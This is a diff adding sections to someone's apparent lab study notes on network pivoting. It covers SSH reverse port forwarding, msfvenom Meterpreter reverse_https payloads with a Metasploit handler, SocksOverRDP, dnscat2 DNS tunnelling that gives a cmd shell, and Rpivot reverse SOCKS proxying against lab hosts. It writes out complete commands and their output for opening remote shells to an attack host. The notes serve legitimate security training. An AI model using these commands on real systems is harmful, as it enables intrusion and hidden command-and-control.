@@ -87,6 +87,39 @@ PORT     STATE SERVICE
 $ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 ```
 
+# Remote/Reverse Port Forwarding with SSH
+
+![](Pasted%20image%2020260111145954.png)
+
+To gain a `Meterpreter shell` on Windows, we will create a Meterpreter HTTPS (or other) payload using `msfvenom`, but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (`172.16.5.129`). We will use the port `8080` on the Ubuntu server to forward all of our reverse packets to our attack hosts' `8000` port, where our Metasploit listener is running.
+
+## msfvenom
+
+```bash
+$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
+```
+
+## Meterpreter multi/handler
+
+```bash
+use exploit/multi/handler
+
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
+payload => windows/x64/meterpreter/reverse_https
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
+lhost => 0.0.0.0
+msf6 exploit(multi/handler) > set lport 8000
+lport => 8000
+msf6 exploit(multi/handler) > run
+```
+
+## Reverse Port Forwarding
+
+```bash
+$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
+```
+
 
 # Socat Redirection with a Revershe Shell
 
@@ -337,3 +370,141 @@ ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
 2022/05/30 14:19:30 client: tun: SSH connected
 ```
 
+# SocksOverRDP
+
+We can start by downloading the appropriate binaries to our attack host to perform this attack. Having the binaries on our attack host will allow us to transfer them to each target where needed. We will need:
+
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
+    
+2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
+    
+	We can look for `ProxifierPE.zip`
+
+Connect to the target using xfreerdp and copy the `SocksOverRDPx64.zip` file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using `regsvr32.exe`.
+
+@windows-attack-box
+```powershell
+C:\> regsvr32.exe SocksOverRDP-Plugin.dll
+```
+
+Connect to target machine over RDP using `mstsc.exe`, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on `127.0.0.1:1080`.
+
+![](Pasted%20image%2020260110173309.png)
+
+We will need to transfer `SocksOverRDPx64.zip` or just the `SocksOverRDP-Server.exe` to target. We can then start SocksOverRDP-Server.exe with `Admin` privileges.
+
+When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on `127.0.0.1:1080`.
+
+```powershell
+C:\> netstat -antb | findstr 1080
+
+  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING
+```
+
+Configure `Proxifier` to forward all our packets to 127.0.0.1:1080. Proxifier will route traffic through the given host and port. 
+
+
+# DNS Tunneling with DNScat2
+
+## Server on Attack Box
+
+```bash
+git clone https://github.com/iagox86/dnscat2.git
+
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
+```
+
+```
+
+```bash
+sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+
+New window created: 0
+dnscat2> New window created: crypto-debug
+Welcome to dnscat2! Some documentation may be out of date.
+
+auto_attach => false
+history_size (for new windows) => 1000
+Security policy changed: All connections must be encrypted
+New window created: dns1
+Starting Dnscat2 DNS server on 10.10.14.18:53
+[domains = inlanefreight.local]...
+
+Assuming you have an authoritative DNS server, you can run
+the client anywhere with the following (--secret is optional):
+
+  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
+
+To talk directly to the server without a domain name, run:
+
+  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
+```
+
+## Client on Target Host
+
+```bash
+$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
+```
+
+```powershell
+PS C:\htb> Import-Module .\dnscat2.ps1
+
+PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
+```
+
+
+## Confirming Session Establishment
+
+```bash
+New window created: 1
+Session 1 Security: ENCRYPTED AND VERIFIED!
+(the security depends on the strength of your pre-shared secret!)
+
+dnscat2>
+
+dnscat2> window -i 1
+New window created: 1
+history_size (session) => 1000
+Session 1 Security: ENCRYPTED AND VERIFIED!
+(the security depends on the strength of your pre-shared secret!)
+This is a console session!
+
+That means that anything you type will be sent as-is to the
+client, and anything they type will be displayed as-is on the
+screen! If the client is executing a command and you don't
+see a prompt, try typing 'pwd' or something!
+
+To go back, type ctrl-z.
+
+Microsoft Windows [Version 10.0.18363.1801]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+exec (OFFICEMANAGER) 1>
+```
+
+## Rpivot
+
+[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.
+
+## Server @attack-box
+
+```bash
+$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+```
+
+## Client @target-box
+
+```bash
+$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
+```
+
+## Confirming Connection is Established
+
+```shell-session
+New connection from host 10.129.202.64, source port 35226
+```
+
+We will configure `proxychains` to pivot over our local server on `127.0.0.1:9050` on our attack host, which was initially started by the Python server.
